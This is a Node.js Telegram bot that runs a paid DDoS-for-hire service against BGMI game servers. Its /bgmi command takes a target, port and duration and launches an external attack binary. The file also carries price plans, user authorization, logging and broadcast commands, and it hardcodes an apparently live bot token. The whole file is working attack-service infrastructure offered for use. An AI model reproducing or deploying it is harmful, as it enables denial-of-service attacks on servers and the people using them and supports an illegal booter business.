const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const { exec } = require("child_process");
const datetime = require("node-datetime");
const path = require("path");
const {spawner} = require("child_process").spawn;
// Insert your Telegram bot token
const bot = new TelegramBot("7283918976:AAHiN-480z_shcT52khW0yarFMU8feDPcVM", {
  polling: true,
});

// Admin user IDs
const adminId = ["701327388", "-1002196164125"];

// File to store allowed user IDs
const USER_FILE = "users.txt";

// File to store command logs
const LOG_FILE = "log.txt";

// Function to read user IDs from the file
function readUsers() {
  try {
    const data = fs.readFileSync(USER_FILE, "utf8");
    return data.split("\n").filter(Boolean);
  } catch (err) {
    return [];
  }
}

// List to store allowed user IDs
let allowedUserIds = readUsers();

// Function to log command to the file
function logCommand(userId, target, port, time) {
  bot.getChat(userId).then((userInfo) => {
    const username = userInfo.username
      ? "@" + userInfo.username
      : `UserID: ${userId}`;
    const logData = `Username: ${username}\nTarget: ${target}\nPort: ${port}\nTime: ${time}\n\n`;

    fs.appendFileSync(LOG_FILE, logData);
  });
}

// Function to clear logs
function clearLogs() {
  try {
    const data = fs.readFileSync(LOG_FILE, "utf8");
    if (!data.trim()) {
      return "Logs are already cleared. No data found.";
    }
    fs.writeFileSync(LOG_FILE, "");
    return "Logs cleared successfully.";
  } catch (err) {
    return "No logs found to clear.";
  }
}

// Function to record command logs
function recordCommandLogs(userId, command, target, port, time) {
  const logEntry = `UserID: ${userId} | Time: ${datetime
    .create()
    .format("Y-m-d H:M:S")} | Command: ${command}`;
  const logData =
    logEntry +
    (target ? ` | Target: ${target}` : "") +
    (port ? ` | Port: ${port}` : "") +
    (time ? ` | Time: ${time}` : "") +
    "\n";
  fs.appendFileSync(LOG_FILE, logData);
}

bot.onText(/\/add (.+)/, (msg, match) => {
  const userId = msg.chat.id.toString();
  if (adminId.includes(userId)) {
    const userToAdd = match[1];
    if (!allowedUserIds.includes(userToAdd)) {
      allowedUserIds.push(userToAdd);
      fs.appendFileSync(USER_FILE, `${userToAdd}\n`);
      bot.sendMessage(msg.chat.id, `User ${userToAdd} added successfully.`);
    } else {
      bot.sendMessage(msg.chat.id, "User already exists.");
    }
  } else {
    bot.sendMessage(msg.chat.id, "Only Admin Can Run This Command.");
  }
});

bot.onText(/\/remove (.+)/, (msg, match) => {
  const userId = msg.chat.id.toString();
  if (adminId.includes(userId)) {
    const userToRemove = match[1];
    const index = allowedUserIds.indexOf(userToRemove);
    if (index !== -1) {
      allowedUserIds.splice(index, 1);
      fs.writeFileSync(USER_FILE, allowedUserIds.join("\n") + "\n");
      bot.sendMessage(
        msg.chat.id,
        `User ${userToRemove} removed successfully.`
      );
    } else {
      bot.sendMessage(
        msg.chat.id,
        `User ${userToRemove} not found in the list.`
      );
    }
  } else {
    bot.sendMessage(msg.chat.id, "Only Admin Can Run This Command.");
  }
});

bot.onText(/\/clearlogs/, (msg) => {
  const userId = msg.chat.id.toString();
  if (adminId.includes(userId)) {
    const response = clearLogs();
    bot.sendMessage(msg.chat.id, response);
  } else {
    bot.sendMessage(msg.chat.id, "Only Admin Can Run This Command.");
  }
});

bot.onText(/\/allusers/, (msg) => {
  const userId = msg.chat.id.toString();
  if (adminId.includes(userId)) {
    try {
      const data = fs.readFileSync(USER_FILE, "utf8");
      const userIds = data.split("\n").filter(Boolean);
      if (userIds.length) {
        let response = "Authorized Users:\n";
        userIds.forEach((id) => {
          bot
            .getChat(id)
            .then((userInfo) => {
              const username = userInfo.username
                ? `@${userInfo.username}`
                : `UserID: ${id}`;
              response += `- ${username} (ID: ${id})\n`;
              if (id === userIds[userIds.length - 1]) {
                bot.sendMessage(msg.chat.id, response);
              }
            })
            .catch(() => {
              response += `- User ID: ${id}\n`;
              if (id === userIds[userIds.length - 1]) {
                bot.sendMessage(msg.chat.id, response);
              }
            });
        });
      } else {
        bot.sendMessage(msg.chat.id, "No data found.");
      }
    } catch (err) {
      bot.sendMessage(msg.chat.id, "No data found.");
    }
  } else {
    bot.sendMessage(msg.chat.id, "Only Admin Can Run This Command.");
  }
});

bot.onText(/\/logs/, (msg) => {
  const userId = msg.chat.id.toString();
  if (adminId.includes(userId)) {
    if (fs.existsSync(LOG_FILE) && fs.statSync(LOG_FILE).size > 0) {
      bot.sendDocument(msg.chat.id, LOG_FILE);
    } else {
      bot.sendMessage(msg.chat.id, "No data found.sssss");
    }
  } else {
    bot.sendMessage(msg.chat.id, "Only Admin Can Run This Command.");
  }
});

bot.onText(/\/id/, (msg) => {
  const userId = msg.chat.id.toString();
  bot.sendMessage(msg.chat.id, `Your ID: ${userId}`);
});

function startAttackReply(message, target, port, time) {
  const username = message.from.username || message.from.first_name;
  const response = `${username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: ${target}\n𝐏𝐨𝐫𝐭: ${port}\n𝐓𝐢𝐦𝐞: ${time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n@ShreekrushnaSHINDE`;
  bot.sendMessage(message.chat.id, response);
}

let bgmiCooldown = {};
const COOLDOWN_TIME = 300;

bot.onText(/\/bgmi/, (msg, match) => {
  const userId = msg.chat.id.toString();
  if (allowedUserIds.includes(userId)) {
    if (!adminId.includes(userId)) {
      console.log("yaha aaya 4");
      if (
        bgmiCooldown[userId] &&
        (new Date() - bgmiCooldown[userId]) / 1000 < COOLDOWN_TIME
      ) {
        bot.sendMessage(
          msg.chat.id,
          "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
        );
        return;
      }
      bgmiCooldown[userId] = new Date();
    }

    const args = match.input.split(' ');
    if (args.length === 4) {
        const [cmd ,target, port, time] = args;
      if (time > 5000) {
        bot.sendMessage(
          msg.chat.id,
          "Error: Time interval must be less than 80."
        );
      } else {
        recordCommandLogs(userId, "/bgmi", target, port, time);
        logCommand(userId, target, port, time);
        startAttackReply(msg, target, port, time);
        // const bgmiPath = path.resolve(__dirname, 'bgmi');
        const fullCommand = `./bgmi ${target} ${port} ${time} 500`;
        const { spawn } = require('child_process');

        const python = spawn('python', ['./read_bgmi.py', JSON.stringify(fullCommand)]);
        
        python.stdout.on('data', (data) => {
            console.log('Python stdout:', data.toString());
        });
        
        python.stderr.on('data', (data) => {
            console.error('Python stderr:', data.toString());
        });
        
        python.on('close', (code) => {
            console.log('Python process exited with code', code);
        });
        
      
        // exec(fullCommand, (error, stdout, stderr) => {
        //   if (error) {
        //     bot.sendMessage(msg.chat.id, `Error: ${stderr}`);
        //     console.log(stderr);
        //   } else {
        //     bot.sendMessage(
        //       msg.chat.id,
        //       `BGMI Attack Finished. Target: ${target} Port: ${port} Time: ${time}`
        //     );
        //   }
        // });
      //   exec(fullCommand, { shell: 'cmd.exe' }, (error, stdout, stderr) => {
      //     if (error) {
      //         console.error('Error executing command:', error);
      //         return;
      //     }
      //     console.log('stdout:', stdout);
      //     console.error('stderr:', stderr);
      // });
      }
    } else {
      bot.sendMessage(
        msg.chat.id,
        "Usage: /bgmi <target> <port> <time>\n@ShreekrushnaSHINDE"
      );
    }
  } else {
    console.log("yaha  t");
    bot.sendMessage(
      msg.chat.id,
      "You Are Not Authorized To Use This Command.\n@ShreekrushnaSHINDE"
    );
  }
});

bot.onText(/\/mylogs/, (msg) => {
  const userId = msg.chat.id.toString();
  console.log(userId);
  if (allowedUserIds.includes(userId)) {
    try {
      const data = fs.readFileSync(LOG_FILE, "utf8");
      const commandLogs = data.split("\n").filter(Boolean);
      const userLogs = commandLogs.filter((log) =>
        log.includes(`UserID: ${userId}`)
      );
      const response = userLogs.length
        ? `Your Command Logs:\n${userLogs.join("\n")}`
        : "No Command Logs Found For You.";
      bot.sendMessage(msg.chat.id, response);
    } catch (err) {
      bot.sendMessage(msg.chat.id, "No command logs found.");
    }
  } else {
    bot.sendMessage(msg.chat.id, "You Are Not Authorized To Use This Command.");
  }
});

bot.onText(/\/help/, (msg) => {
  const helpText = `Available commands:
    /bgmi : Method For Bgmi Servers.
    /rules : Please Check Before Use !!.
    
    @ShreekrushnaSHINDE`;
  bot.sendMessage(msg.chat.id, helpText);
});

bot.onText(/\/start/, (msg) => {
  const userName = msg.from.first_name;
  const response = `Welcome to Your Home, ${userName}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\n@ShreekrushnaSHINDE`;
  bot.sendMessage(msg.chat.id, response);
});

bot.onText(/\/rules/, (msg) => {
  const userName = msg.from.first_name;
  const response = `${userName} Please Follow These Rules:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
@ShreekrushnaSHINDE`;
  bot.sendMessage(msg.chat.id, response);
});

bot.onText(/\/plan/, (msg) => {
  const userName = msg.from.first_name;
  const response = `${userName}, Brother Only 1 Plan Is Powerful Than Any Other Ddos!!:

Vip :
-> Attack Time : 200 (S)
> After Attack Limit : 2 Min
-> Concurrents Attack : 300

Price List:
Day-->150 Rs
Week-->900 Rs
Month-->1600 Rs
@ShreekrushnaSHINDE`;
  bot.sendMessage(msg.chat.id, response);
});

bot.onText(/\/admincmd/, (msg) => {
  const userName = msg.from.first_name;
  const response = `${userName}, Admin Commands Are Here!!:

/add <userId> : Add a User.
/remove <userId> Remove a User.
/allusers : Authorized Users Lists.
/logs : All Users Logs.
/broadcast : Broadcast a Message.
/clearlogs : Clear The Logs File.
@ShreekrushnaSHINDE`;
  bot.sendMessage(msg.chat.id, response);
});

bot.onText(/\/broadcast (.+)/, (msg, match) => {
  const userId = msg.chat.id.toString();
  if (adminId.includes(userId)) {
    const messageToBroadcast = "Message To All Users By Admin:\n\n" + match[1];
    const userIds = readUsers();
    userIds.forEach((id) => {
      bot.sendMessage(id, messageToBroadcast).catch((err) => {
        console.log(
          `Failed to send broadcast message to user ${id}: ${err.message}`
        );
      });
    });
    bot.sendMessage(
      msg.chat.id,
      "Broadcast Message Sent Successfully To All Users."
    );
  } else {
    bot.sendMessage(msg.chat.id, "Only Admin Can Run This Command.");
  }
});

bot.on("polling_error", (error) => {
  console.error(`Polling error: ${error.code} - ${error.message}`);
});

// Start the bot
bot.startPolling();
